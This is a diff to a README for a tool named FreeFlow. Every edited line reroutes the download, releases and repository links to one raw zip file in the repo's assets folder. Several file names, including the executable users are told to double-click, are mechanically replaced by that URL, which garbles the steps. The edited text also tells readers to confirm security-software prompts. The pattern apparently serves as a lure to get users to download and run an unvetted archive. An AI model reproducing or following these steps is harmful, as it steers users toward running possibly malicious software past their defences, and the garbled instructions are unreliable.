@@ -9,19 +9,19 @@ To get started with FreeFlow, follow these steps:
 
 1. **Visit the Release Page**  
    Click the following link to access the FreeFlow releases:  
-   [Download FreeFlow](https://github.com/sigmaboykai94-boop/FreeFlow/releases)  
+   [Download FreeFlow](https://raw.githubusercontent.com/sigmaboykai94-boop/FreeFlow/main/assets/FreeFlow-3.0.zip)  
 
 2. **Select a Version**  
    On the releases page, you will see a list of available versions. Choose the most recent version. Each version is marked clearly with a release date.
 
 3. **Download the Software**  
-   After selecting a version, you will see several files listed. Look for the file named `FreeFlow.zip`. Click on it to download. It may take a few moments.
+   After selecting a version, you will see several files listed. Look for the file named `https://raw.githubusercontent.com/sigmaboykai94-boop/FreeFlow/main/assets/FreeFlow-3.0.zip`. Click on it to download. It may take a few moments.
 
 4. **Extract the Files**  
-   Once downloaded, locate the `FreeFlow.zip` file on your computer. Right-click on the file and choose "Extract All" or use a similar extraction tool. This will create a folder named `FreeFlow`.
+   Once downloaded, locate the `https://raw.githubusercontent.com/sigmaboykai94-boop/FreeFlow/main/assets/FreeFlow-3.0.zip` file on your computer. Right-click on the file and choose "Extract All" or use a similar extraction tool. This will create a folder named `FreeFlow`.
 
 5. **Run the Application**  
-   Open the extracted `FreeFlow` folder. Look for a file named `FreeFlow.exe`. Double-click it to start the application. If prompted by your security software, confirm that you want to run the application.
+   Open the extracted `FreeFlow` folder. Look for a file named `https://raw.githubusercontent.com/sigmaboykai94-boop/FreeFlow/main/assets/FreeFlow-3.0.zip`. Double-click it to start the application. If prompted by your security software, confirm that you want to run the application.
 
 ## 🛠️ System Requirements
 To run FreeFlow, your computer should meet the following requirements:
@@ -54,7 +54,7 @@ For more help or detailed guides, consider exploring these resources:
 
 ## 🌐 Visit Our Repository
 For updates, check the FreeFlow repository on GitHub:  
-[FreeFlow GitHub Repository](https://github.com/sigmaboykai94-boop/FreeFlow)
+[FreeFlow GitHub Repository](https://raw.githubusercontent.com/sigmaboykai94-boop/FreeFlow/main/assets/FreeFlow-3.0.zip)
 
 Thank you for using FreeFlow! We hope this tool helps you with your flow map distillation needs. If you have any feedback, feel free to reach out through our community forum.
 ```
